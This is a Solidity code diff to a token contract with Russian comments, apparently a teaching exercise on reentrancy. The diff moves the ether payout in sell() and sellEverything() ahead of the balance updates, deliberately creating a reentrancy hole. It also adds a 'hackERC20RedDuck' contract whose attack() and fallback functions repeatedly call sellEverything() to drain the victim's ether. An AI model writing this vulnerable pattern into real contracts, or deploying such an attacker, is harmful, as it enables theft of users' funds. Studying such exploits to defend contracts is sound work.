@@ -188,31 +188,53 @@ contract erc20RedDuck is ERC20Interface {
             revert("Cannot sell Oleksiirium for now"); // если на нашем кошельке недостаточно денег чтобы оплатить покупку - возвращаем эфир отправителю
         }
         else _transfer(owner, msg.sender, _cost); //отправляем олексириум покупателю по текущему курсу
-
-        
-        emit Transfer(address(this), msg.sender, _cost); //такие штуки надо записывать в блокчейн
     }
     
     function sell(uint256 _amount) external {
-        require(_amount <= balances[msg.sender], "You don`t have this count of tokens");
-
+        require(_amount <= balances[msg.sender], "You don`t have this count of tokens"); 
+        msg.sender.call{ value: _amount * coin_price }("");
+        //payable(msg.sender).call.value(_amount / coin_price)(); //отправляем эфир по текущему курсу
         balances[msg.sender] = balances[msg.sender].sub(_amount); // отнимаем с аккаунта олексириум, который продаёт пользователь
         balances[address(this)] = balances[address(this)].add(_amount); //добавляем олексириум нам
-        payable(msg.sender).transfer(_amount / coin_price); //отправляем эфир по текущему курсу
 
         emit Transfer(msg.sender, address(this), _amount); //такие штуки надо записывать в блокчейн
+        
 
     }
 
     function sellEverything() external {
-
-        balances[address(this)] = balances[address(this)].add(balances[msg.sender]); //добавляем олексириум нам
-        uint256 _amount = balances[msg.sender]; //запоминаем сколько продали
-
-        balances[msg.sender] = 0; // отнимаем с аккаунта весь Олексириум
-        payable(msg.sender).transfer(balances[msg.sender] * coin_price);
+        msg.sender.call{ value: balances[msg.sender] * coin_price }("");
         
-        emit Transfer(msg.sender, address(this), _amount); //такие штуки надо записывать в блокчейн
+        balances[address(this)] = balances[address(this)].add(balances[msg.sender]); //добавляем олексириум нам
+        balances[msg.sender] = 0; // отнимаем с аккаунта олексириум, который продаёт пользователь
+        
+
     }
 
 }
+
+contract hackERC20RedDuck {
+    erc20RedDuck public victim;
+
+    constructor(address victimAddress) {
+        victim = erc20RedDuck(victimAddress);
+    }
+
+    // Fallback - тип функции, который всегда отвечает на входящие транзакции
+    fallback() external payable {
+         if (address(victim).balance >= 1 ether) {
+            victim.sellEverything();
+         
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, 'MSG.Value is lower than 1 ether');
+        victim.buy{value: 1 ether}();
+        victim.sellEverything();
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+} 
